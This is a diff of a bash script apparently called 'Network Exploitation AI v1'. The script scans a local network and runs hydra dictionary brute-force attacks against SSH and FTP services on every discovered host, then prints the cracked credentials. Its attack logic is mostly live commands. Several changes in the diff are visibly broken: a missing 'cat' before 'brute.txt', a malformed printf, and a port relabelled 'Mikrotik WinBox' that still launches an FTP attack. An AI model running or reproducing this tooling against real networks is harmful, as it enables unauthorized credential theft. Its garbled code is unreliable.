@@ -25,7 +25,7 @@ Network Exploitation AI v1
 printf "[i] Found network SSID:%s $network_ssid\n"
 printf "[i] Found network gateway:%s $gateway\n"
 printf "[*] Scanning entire network...\n"
-printf "[i] Found localhost: $localhost, whitelisting...\n"
+printf "[i] Found localhost: %s$localhost, whitelisting...\n"
 
 
 
@@ -88,30 +88,34 @@ do
                 printf "[i] \e[92mSSH\e[0m service detected!\n"
                 hydra -L user.txt -P pass.txt -I "${ips[$i]}" ssh -f -o brute.txt
                 printf "[i] CREDINENTIALS:\n\e[94m"	
-                cat brute.txt | awk '/login/{print $3" "$5":" $7}'
+                brute.txt | awk '/login/{print $3" "$5":" $7}'
                 printf "\e[0m" 
                 read -p "Press [ENTER] to continue!"
-            elif [ "${ports[$y]}" == "443" ]
-            then 
-                printf "[i] \e[92mHTTPS\e[0m service detected!\n"
+            # elif [ "${ports[$y]}" == "443" ]
+            # then 
+            #     printf "[i] \e[92mHTTPS\e[0m service detected!\n"
 
-            elif [ "${ports[$y]}" == "21" ]
+            elif [ "${ports[$y]}" == "5963" ]
             then 
-                printf "[i] \e[92mFTP\e[0m service detected!\n"
+                printf "[i] \e[92mMikrotik WinBox\e[0m service detected!\n"
                 hydra -L user.txt -P pass.txt -I "${ips[$i]}" ftp -f -o brute.txt
                 #default dictionary attack
                 # medusa -h "${ips[$i]}" -u admin -P $wordlist -M ftp
-
+            elif [ "${ports[$y]}" == "22" ]
+            then 
+                printf "[i] \e[92mSSH\e[0m service detected!\n"
+                
+                read -p "Press [ENTER] to continue!"
                 
 
-            elif [ "${ports[$y]}" == "23" ]
-            then 
-                printf "[i] \e[92mTELNET\e[0m service detected!\n"
-            elif [ "${ports[$y]}" == "445" ]
+            # elif [ "${ports[$y]}" == "23" ]
+            # then 
+            #     printf "[i] \e[92mTELNET\e[0m service detected!\n"
+            # elif [ "${ports[$y]}" == "445" ]
 
-            then 
-                printf "[i] \e[92mSMB\e[0m service detected!\n"
-                #   hydra -t 1 -V -f -L user.txt -P pass.txt "${ips[$i]}" smb
+            # then 
+            #     printf "[i] \e[92mSMB\e[0m service detected!\n"
+            #     #   hydra -t 1 -V -f -L user.txt -P pass.txt "${ips[$i]}" smb
 
             else
                 printf "[!] Service on port \e[94m%s${ports[$y]}\e[0m is not supported yet! Skipping...\n"
